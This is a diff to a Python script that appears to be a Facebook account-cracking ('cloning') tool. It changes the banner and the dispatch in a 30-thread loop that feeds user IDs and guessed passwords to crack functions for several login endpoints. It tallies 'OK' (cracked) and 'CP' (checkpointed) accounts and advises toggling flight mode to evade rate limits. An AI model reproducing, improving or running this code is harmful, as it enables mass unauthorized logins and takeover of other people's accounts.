@@ -639,13 +639,12 @@ def banner():
 # Define the passwrd function
 def passwrd():
     os.system('clear')
-    banner()
-    info()
-    print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
-    print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-    linex()
-    print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
-    linex()
+    print(logo)
+    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
+    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
+    print('\033[0;97m-----------------------------------------------')
+    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
+    print('\033[0;97m-----------------------------------------------')
     
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -714,20 +713,23 @@ def passwrd():
                 pool.submit(crack, idf, pwv)
             elif 'free' in method:
                 pool.submit(crackfree, idf, pwv)
-            elif 'bapi' in method:
-                pool.submit(bapi, idf, pwv)
-            elif 'free' in method:
+            elif 'touch' in method:
+                pool.submit(crackfree, idf, pwv)
+            elif 'mbasic' in method:
                 pool.submit(crackfree, idf, pwv)
             else:
-                pool.submit(crackmbasic, idf, pwv)
-                
-    print('\n\x1b[37m----------------------------------------------')
-    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
-    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
-    print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
-    linex()
-    woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
-    restart()
+                pool.submit(crackfree, idf, pwv)
+    
+    print('\033[0;91m-----------------------------------------------')
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
+    print('\033[0;91m-----------------------------------------------')
+    
+    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
+    os.system("python TOXIC.py")
+    exit()
+
 
 #--------------------[ METODE-B-API ]-----------------#
  
